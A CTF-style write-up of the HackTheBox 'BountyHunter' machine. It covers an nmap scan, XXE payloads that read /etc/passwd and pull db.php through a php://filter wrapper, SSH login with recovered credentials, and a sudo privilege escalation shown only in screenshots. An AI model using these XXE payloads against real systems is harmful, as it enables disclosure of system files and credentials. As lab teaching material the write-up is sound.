---
title: BountyHunter -- Writeup
date: 2021-12-01
categories: [HackTheBox, Easy]
tags: [hackthebox, ctf, xxe]     # TAG names should always be lowercase
---

# Summary -
Easy rated Hackthebox machine. To get initial access, have to do XXE with the help of other information. Also, privilege escalation is pretty tricky as well... Have to create a certain .md file in a certain way to abuse it. Overall a fun machine...

# Enumeration -
nmap, here we go...
### nmap -
```bash
# Nmap 7.91 scan initiated Sun Jul 25 05:59:02 2021 as: nmap -T4 -A -p22,80 -oA nmap 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   106.81 ms 10.10.14.1
2   106.89 ms 10.10.11.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 25 05:59:16 2021 -- 1 IP address (1 host up) scanned in 14.23 seconds
```
Two ports are open. 22 ssh and 80 http server.

**port 80** -
Contains some portal which says its in development.
Looks like its using XML as backend. Let's intercept using Burp and see.

![Burp](/assets/img/hackthebox/bountyhacker/1.png)

# Explotation -
So, its sending data with base64 encoding which if we decode then we can see data parsing using XML format. That means we can try XXE here. Yay!

```xml
# Default
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>apache</title>
		<cwe>ads</cwe>
		<cvss>asd</cvss>
		<reward>asd</reward>
		</bugreport>

# XXE for file disclosure
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>ads</cwe>
		<cvss>asd</cvss>
		<reward>asd</reward>
	</bugreport>

# XXE with php filter.
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
	<bugreport>
		<title>&xxe;</title>
		<cwe>ads</cwe>
		<cvss>asd</cvss>
		<reward>asd</reward>
	</bugreport>
```

Okay, so XXE worked. (Make sure to put base64 encoded payload.) With /etc/passwd file disclosure payload.
Hmm... I tried to grab ssh keys but no luck. But fluff showed one interesting file which is db.php maybe we can grab it through XXE and then maybe we can see something.

![ffuf](/assets/img/hackthebox/bountyhacker/9.png)

So... With the help of XXE php wrapper I managed to get that file which showed some creds.

![creds](/assets/img/hackthebox/bountyhacker/2.png)

From /etc/passwd disclosure, there are two users in home directory which are development and sysylog but creds worked for development user. (Read /etc/passwd to confirm this.)

**development:\<redacted\>** #ssh creds

Let's try to ssh to developement with above creds and it should work.

![login](/assets/img/hackthebox/bountyhacker/3.png)

# Post Exploitation -
Let's login as development user.

`sudo -l` revealed interesting file we can execute as root without password...

According to the condition its taking we need to create a manually .md file with certain conditions to abuse it.

![ticket](/assets/img/hackthebox/bountyhacker/4.png)

Run ticketValidator.py as sudo and give path of your .md file and you should get root.

![getroot](/assets/img/hackthebox/bountyhacker/5.png)